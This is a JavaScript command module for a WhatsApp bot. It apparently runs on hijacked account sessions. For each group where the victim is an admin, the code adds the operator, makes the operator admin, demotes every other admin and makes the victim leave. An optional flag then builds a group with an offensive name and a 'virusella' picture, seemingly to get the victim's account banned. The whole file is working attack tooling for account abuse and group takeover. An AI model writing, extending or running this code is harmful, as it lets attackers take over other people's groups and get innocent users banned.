const path = require('path');
const fs = require('fs').promises;
const paths = require('../../resources/paths');
const textuals = require('../../resources/textuals');
const commands = require('../../resources/commands');

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function getAllGbAdmin(sock, targetSock, msg,toBan) {
  try {
    if (!sock || !targetSock || !msg) {
      return await sock.sendMessage(msg.key.remoteJid, { react: { text: "❌", key: msg.key } });
    }

    if (!targetSock.user) {
      return await sock.sendMessage(msg.key.remoteJid, { react: { text: "❓", key: msg.key } });
    }
    const targetJid = {
      id: targetSock.user.id.split(":")[0] + "@s.whatsapp.net",
      lid: targetSock.user.lid ? targetSock.user.lid.split(":")[0] + "@lid" : null
    };
  

    const groups = await targetSock.groupFetchAllParticipating();
    if (!groups || Object.keys(groups).length === 0) {
      return await sock.sendMessage(msg.key.remoteJid, { react: { text: "❕", key: msg.key } });
    }

    const MyJid = {
      id: sock.user.id.split(":")[0] + "@s.whatsapp.net",
      lid: sock.user.lid ? sock.user.lid.split(":")[0] + "@lid" : null
    };

 

    const isMyJid = (id) => id === MyJid.id || id === MyJid.lid;
    const isTargetJid = (id) => id === targetJid.id || id === targetJid.lid;

    for (const group of Object.values(groups)) {
      const groupId = group.id;

      let metadata;
      try {
        metadata = await targetSock.groupMetadata(groupId);
      } catch (err) {
        console.log(`⚠️ فشل في جلب بيانات الجروب ${groupId}:`, err.message);
        continue;
      }


      const isAdmin = metadata.participants.some(p =>
        isTargetJid(p.id) && p.admin !== null
      );
      if (!isAdmin) continue;

      console.log(`🟡 معالجة الجروب: ${metadata.subject}`);

      const isMember = metadata.participants.some(p => isMyJid(p.id));
      const IfIamAdmin = metadata.participants.some(p =>
        isMyJid(p.id) && p.admin !== null
      );

      if (!isMember) {
        try {
          await targetSock.groupParticipantsUpdate(groupId, [MyJid.id], "add");
          console.log("✅ تمت إضافتي للجروب");
        } catch (err) {
          console.log(`❌ فشل في إضافتي إلى الجروب ${groupId}:`, err.message);
          continue;
        }
        await delay(500);
      }

      if (!IfIamAdmin) {
        try {
          await targetSock.groupParticipantsUpdate(groupId, [MyJid.id], "promote");
          console.log("✅ تمت ترقيتي كأدمن");
        } catch (err) {
          console.log(`❌ فشل في ترقيتي كأدمن بالجروب ${groupId}:`, err.message);
          continue;
        }
        await delay(500);
      }

      let newMetaData;
      try {
        newMetaData = await targetSock.groupMetadata(groupId);
      } catch (err) {
        console.log(`⚠️ فشل في تحديث بيانات الجروب ${groupId}:`, err.message);
        continue;
      }

      const membersToDemote = newMetaData.participants
        .filter(p => p.admin && !isMyJid(p.id) && !isTargetJid(p.id))
        .map(p => p.id);

      if (membersToDemote.length > 0) {
        try {
          await targetSock.groupParticipantsUpdate(groupId, membersToDemote, "demote");
         

          console.log("🔻 تم تنزيل باقي الأدمنات");
        } catch (err) {
          console.log(`⚠️ فشل في تنزيل الأدمنات في ${groupId}:`, err.message);
        }
        await delay(500);
      }

    
        try {
          await targetSock.groupLeave(groupId);
          console.log("🚪 غادرت الجروب بعد الانتهاء");
        } catch (err) {
          console.log(`⚠️ فشل في مغادرة الجروب ${groupId}:`, err.message);
          continue;
      }

      await delay(500);
    };
    if( toBan === true){
       
            const createdGroup = await targetSock.groupCreate("انتهاك بنعال دايرل", [targetJid.id]);
    const awwaGroupId = createdGroup.id;
    await delay(500);
    await targetSock.updateProfilePicture(awwaGroupId, { url:"resources/images/virusella.jpg" });
   
       

  
  }
  
 await sock.sendMessage(msg.key.remoteJid, { react: { text: "✅", key: msg.key } });

  } catch (error) {
    console.error(error.message);
    await sock.sendMessage(msg.key.remoteJid, { react: { text: "🛑", key: msg.key } });
  }
}

module.exports = {
  name: commands.getAllGbAdmin.plug,
  description: commands.getAllGbAdmin.desc,
  async execute(sock, msg, args, MyJid, sender, activeSessions) {
    try {
  
      let toBan = false;
if(args.length === 2){
      const [sessionName,suspned] = args;
      const targetSock = activeSessions[sessionName];
    if(suspned === "true"){
toBan = true;
    }else{
      if(suspned === "false"){
        toBan = false;
      }else{
        toBan = false;
      }


    }
      if (!targetSock) {
        return await sock.sendMessage(msg.key.remoteJid, { react: { text: "🔍", key: msg.key } });
      }

      await getAllGbAdmin(sock, targetSock, msg, toBan);

return;

}else{

  return await sock.sendMessage(msg.key.remoteJid, { react: { text: "❓", key: msg.key } });
}
      
    } catch (error) {
      console.error( error.message);
      await sock.sendMessage(msg.key.remoteJid, { react: { text: "🛑", key: msg.key } });
    }
  }
};
